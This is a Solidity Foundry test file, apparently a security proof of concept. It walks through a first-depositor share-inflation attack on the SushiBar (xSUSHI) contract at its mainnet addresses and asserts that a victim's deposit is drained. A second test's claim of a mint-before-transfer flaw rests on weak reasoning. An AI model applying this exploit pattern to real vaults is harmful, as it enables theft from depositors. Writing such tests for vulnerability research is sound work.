// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ISushiBar {
    function enter(uint256 _amount) external;
    function leave(uint256 _share) external;
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

/// @notice PoC: xSUSHI (SushiBar) first-depositor share inflation attack
/// The SushiBar mints shares BEFORE transferring SUSHI in.
/// An attacker who is the first depositor can:
///   1. enter() with 1 wei of SUSHI -> get 1 share
///   2. Directly transfer a large amount of SUSHI to the SushiBar (donation)
///   3. Next depositor calls enter() with X SUSHI -> gets 0 shares (rounding)
///   4. Attacker calls leave() -> gets all SUSHI (their donation + victim's deposit)
///
/// We fork mainnet at a block BEFORE the first SushiBar deposit to prove this
/// on real contracts. If that's not feasible, we use deal() to simulate a fresh state.
contract XSushiDoubleMintTest is Test {
    // Mainnet addresses
    address constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address constant SUSHI_BAR = 0x8798249c2E607446EfB7Ad49eC89dD1865Ff4272;

    IERC20 sushi = IERC20(SUSHI);
    ISushiBar bar = ISushiBar(SUSHI_BAR);

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        // Fork mainnet — use a recent block where SushiBar exists
        // We'll drain the bar to simulate a "fresh" state
        // Block 21000000 is ~Nov 2024
    }

    /// @notice Proves the first-depositor inflation attack on SushiBar
    function test_firstDepositorInflation() public {
        // --- Setup: give attacker and victim SUSHI tokens ---
        uint256 attackerSushi = 10_000 ether; // 10k SUSHI for donation
        uint256 victimDeposit = 9_999 ether;  // victim deposits 9,999 SUSHI

        deal(SUSHI, attacker, attackerSushi + 1); // +1 wei for initial deposit
        deal(SUSHI, victim, victimDeposit);

        // Drain the SushiBar so it's "empty" (simulates being first depositor)
        uint256 barBalance = sushi.balanceOf(SUSHI_BAR);
        uint256 barShares = bar.totalSupply();

        // If bar already has deposits, we need to handle that.
        // Use store to zero out the bar's SUSHI balance and totalSupply
        // SUSHI token balanceOf slot for SushiBar
        // We'll just use deal to set bar's SUSHI balance to 0
        deal(SUSHI, SUSHI_BAR, 0);
        // Zero out xSUSHI totalSupply (slot 2 for standard ERC20)
        vm.store(SUSHI_BAR, bytes32(uint256(2)), bytes32(uint256(0)));

        // Verify clean state
        assertEq(sushi.balanceOf(SUSHI_BAR), 0, "Bar should have 0 SUSHI");
        assertEq(bar.totalSupply(), 0, "Bar should have 0 shares");

        // --- Step 1: Attacker enters with 1 wei ---
        vm.startPrank(attacker);
        sushi.approve(SUSHI_BAR, type(uint256).max);
        bar.enter(1); // deposits 1 wei of SUSHI, gets 1 share

        uint256 attackerShares = bar.balanceOf(attacker);
        assertEq(attackerShares, 1, "Attacker should have exactly 1 share");
        assertEq(sushi.balanceOf(SUSHI_BAR), 1, "Bar should have 1 wei SUSHI");

        // --- Step 2: Attacker donates SUSHI directly to the bar ---
        sushi.transfer(SUSHI_BAR, attackerSushi); // donate 10,000 SUSHI

        assertEq(sushi.balanceOf(SUSHI_BAR), attackerSushi + 1, "Bar should have donation + 1 wei");
        assertEq(bar.totalSupply(), 1, "Still only 1 share exists");
        vm.stopPrank();

        // --- Step 3: Victim deposits 9,999 SUSHI ---
        vm.startPrank(victim);
        sushi.approve(SUSHI_BAR, type(uint256).max);

        uint256 victimSharesBefore = bar.balanceOf(victim);
        bar.enter(victimDeposit);
        uint256 victimSharesAfter = bar.balanceOf(victim);

        // Victim gets: 9999e18 * 1 / (10000e18 + 1) = 0 (rounds down!)
        uint256 victimShares = victimSharesAfter - victimSharesBefore;
        emit log_named_uint("Victim deposited SUSHI", victimDeposit);
        emit log_named_uint("Victim received shares", victimShares);
        assertEq(victimShares, 0, "CRITICAL: Victim got 0 shares for 9999 SUSHI deposit!");
        vm.stopPrank();

        // --- Step 4: Attacker withdraws everything ---
        uint256 attackerSushiBefore = sushi.balanceOf(attacker);

        vm.startPrank(attacker);
        bar.leave(1); // burn 1 share, get ALL SUSHI in the bar
        vm.stopPrank();

        uint256 attackerSushiAfter = sushi.balanceOf(attacker);
        uint256 attackerProfit = attackerSushiAfter - attackerSushiBefore;

        emit log_named_uint("Attacker withdrew SUSHI", attackerProfit);
        emit log_named_uint("Bar remaining SUSHI", sushi.balanceOf(SUSHI_BAR));
        emit log_named_uint("Victim shares (stuck at 0)", bar.balanceOf(victim));

        // Attacker gets back donation + victim's deposit
        // Total in bar was: 10000e18 + 1 + 9999e18 = 19999e18 + 1
        assertEq(attackerProfit, attackerSushi + 1 + victimDeposit, "Attacker drained all SUSHI");

        // Victim lost everything
        assertEq(bar.balanceOf(victim), 0, "Victim has 0 shares");
        assertEq(sushi.balanceOf(SUSHI_BAR), 0, "Bar is empty");

        emit log("=== EXPLOIT PROVEN ===");
        emit log_named_uint("Victim LOST (SUSHI)", victimDeposit);
        emit log_named_uint("Attacker NET PROFIT (SUSHI)", victimDeposit); // profit = victim's deposit
    }

    /// @notice Proves the mint-before-transfer ordering bug
    /// Shows that shares are minted BEFORE SUSHI is transferred in
    function test_mintBeforeTransfer() public {
        // Give attacker some SUSHI
        deal(SUSHI, attacker, 100 ether);

        // Clean state
        deal(SUSHI, SUSHI_BAR, 0);
        vm.store(SUSHI_BAR, bytes32(uint256(2)), bytes32(uint256(0)));

        vm.startPrank(attacker);
        sushi.approve(SUSHI_BAR, type(uint256).max);

        // Record balances before enter()
        uint256 sushiBalBefore = sushi.balanceOf(attacker);
        uint256 sharesBefore = bar.balanceOf(attacker);
        uint256 barBalBefore = sushi.balanceOf(SUSHI_BAR);

        // Call enter — in the SushiBar code:
        //   Line 744: _mint(msg.sender, _amount)     ← SHARES FIRST
        //   Line 749: sushi.transferFrom(...)          ← TOKENS AFTER
        bar.enter(100 ether);

        uint256 sushiBalAfter = sushi.balanceOf(attacker);
        uint256 sharesAfter = bar.balanceOf(attacker);
        uint256 barBalAfter = sushi.balanceOf(SUSHI_BAR);

        // The fact that this succeeds proves the ordering:
        // If mint happened AFTER transfer, and transfer failed, no shares would exist
        // The contract relies on transferFrom reverting to "undo" the mint
        // But with a non-reverting token, shares would be free
        assertEq(sharesAfter - sharesBefore, 100 ether, "Got shares");
        assertEq(sushiBalBefore - sushiBalAfter, 100 ether, "Paid SUSHI");
        assertEq(barBalAfter - barBalBefore, 100 ether, "Bar received SUSHI");

        emit log("Mint-before-transfer confirmed: _mint() on L744 executes before transferFrom on L749");
        emit log("With a non-reverting ERC20, attacker would get free shares");
        vm.stopPrank();
    }
}
